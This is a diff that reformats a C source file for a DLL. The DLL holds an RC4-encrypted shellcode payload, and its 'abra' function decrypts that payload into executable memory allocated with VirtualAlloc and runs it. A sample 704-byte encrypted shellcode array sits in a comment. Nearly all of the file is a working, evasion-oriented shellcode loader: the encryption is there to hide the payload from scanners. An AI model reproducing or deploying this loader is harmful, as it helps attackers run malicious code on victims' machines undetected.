@@ -5,24 +5,24 @@ This is the file that will be made into a DLL. It contains the encrypted shellco
 "abra" decrypts and runs the shellcode.
 */
 
-#include "windows.h"
 #include "rc4_enc_dll.hpp"
+#include "windows.h"
 
-//This is the length of payload_encrypted. We need it because
-//the encrypted payload could contain null bytes, which would
-//be considered "the end" by most size-checkers.
-//JUST COUNT IT.
+// This is the length of payload_encrypted. We need it because
+// the encrypted payload could contain null bytes, which would
+// be considered "the end" by most size-checkers.
+// JUST COUNT IT.
 const int enc_payload_len = 0;
 /*
 Example:
 const int enc_payload_len=704;
 */
-//This should be the rc4-encrypted payload.
-//See the README for how to obtain one.
+// This should be the rc4-encrypted payload.
+// See the README for how to obtain one.
 unsigned char payload_encrypted[] = "RC4-ENC PAYLOAD GOES HERE";
 /*
 Example:
-//In this case, each line has 15 chars. Multiplication is your friend!
+// In this case, each line has 15 chars. Multiplication is your friend!
 unsigned char payload_encrypted[] =
 "\xda\xdb\x79\xa4\x73\xc1\xfd\x5d\xd3\xff\xa3\xd0\x61\xc4\xf4" //1 (*15)
 "\xd9\x7a\x3a\xcc\xc5\x0a\x97\x18\xf3\x6c\xe2\xc5\xed\xac\xc4" //2 (*15)
@@ -73,64 +73,71 @@ unsigned char payload_encrypted[] =
 "\xcd\x2f\x68\x7f\xa6\xb8\xaf\x37\x1c\x65\xd9\x16\x3b\x7d"; //46*15+14 = 704
 */
 
-//This wonderful function encrypts and decrypts RC4. All args are pretty self-explanatory.
-//outputarr[] must have length msglen.
-//rc4_crypt is not exported.
-int rc4_crypt(unsigned char key[], unsigned char message[], 
-	                      int keylen, int msglen, unsigned char outputarr[]) {
-	//Create a bunch of variables.
-	int S[256];
-	//i and j are indicies in the permutation array, t is a temp, and n is the current pos in msg.
-	int i = 0, j = 0, t, n;
+// This wonderful function encrypts and decrypts RC4. All args are pretty self-explanatory.
+// outputarr[] must have length msglen.
+// rc4_crypt is not exported.
+int rc4_crypt(unsigned char key[], unsigned char message[],
+    int keylen, int msglen, unsigned char outputarr[])
+{
+    // Create a bunch of variables.
+    int S[256];
+    // i and j are indicies in the permutation array, t is a temp, and n is the current pos in msg.
+    int i = 0, j = 0, t, n;
 
-	//Initialize the permutation array with the identity.
-	for (i = 0; i < 256; i++) {
-		S[i] = i;
-	}
+    // Initialize the permutation array with the identity.
+    for (i = 0; i < 256; i++) {
+        S[i] = i;
+    }
 
-	//Mix up that permutation array!
-	for (i = 0; i < 256; i++) {
-		//Get the next j-value
-		j = (j + S[i] + key[i % keylen]) % 256;
+    // Mix up that permutation array!
+    for (i = 0; i < 256; i++) {
+        // Get the next j-value
+        j = (j + S[i] + key[i % keylen]) % 256;
 
-		//Swap S[i] and S[j].
-		t = S[i]; S[i] = S[j]; S[j] = t;
-	}
+        // Swap S[i] and S[j].
+        t = S[i];
+        S[i] = S[j];
+        S[j] = t;
+    }
 
-	//Reset i and j.
-	i = 0; j = 0;
-	//Loop through each character of the message.
-	for (n = 0; n < msglen; n++) {
-		//Increment i.
-		i = (i + 1) % 256;
-		//Get the next value of j.
-		j = (j + S[i]) % 256;
-		//Swap S[i] and S[j].
-		t = S[i]; S[i] = S[j]; S[j] = t;
-		//Xor our pseudorandom output with a message byte.
-		//Store the result in the outputarr.
-		outputarr[n] = message[n] ^ S[(S[i] + S[j]) % 256];
-	}
+    // Reset i and j.
+    i = 0;
+    j = 0;
+    // Loop through each character of the message.
+    for (n = 0; n < msglen; n++) {
+        // Increment i.
+        i = (i + 1) % 256;
+        // Get the next value of j.
+        j = (j + S[i]) % 256;
+        // Swap S[i] and S[j].
+        t = S[i];
+        S[i] = S[j];
+        S[j] = t;
+        // Xor our pseudorandom output with a message byte.
+        // Store the result in the outputarr.
+        outputarr[n] = message[n] ^ S[(S[i] + S[j]) % 256];
+    }
 
-	return 0;
+    return 0;
 }
 
-//Magic function... who knows what it does?
-//Fortunately, I do! It decrypts and runs the shellcode defined above.
-void abra(unsigned char key[], int keylen) {
-   //Let's allocate ourselves an output array.
-   //RC4 has the same size encrypted and decrypted.
-   unsigned char payload[enc_payload_len];
+// Magic function... who knows what it does?
+// Fortunately, I do! It decrypts and runs the shellcode defined above.
+void abra(unsigned char key[], int keylen)
+{
+    // Let's allocate ourselves an output array.
+    // RC4 has the same size encrypted and decrypted.
+    unsigned char payload[enc_payload_len];
 
-   //Let's decrypt that shellcode!
-   rc4_crypt(key, payload_encrypted, keylen, enc_payload_len, payload);
+    // Let's decrypt that shellcode!
+    rc4_crypt(key, payload_encrypted, keylen, enc_payload_len, payload);
 
-   //Allocate space for our function.
-   void *func = VirtualAlloc(0, enc_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    // Allocate space for our function.
+    void* func = VirtualAlloc(0, enc_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-   //Copy our shellcode in.
-   memcpy(func, payload, enc_payload_len);
+    // Copy our shellcode in.
+    memcpy(func, payload, enc_payload_len);
 
-   //And run it! We're done.
-   ((void(*)())func)();
+    // And run it! We're done.
+    ((void (*)())func)();
 }
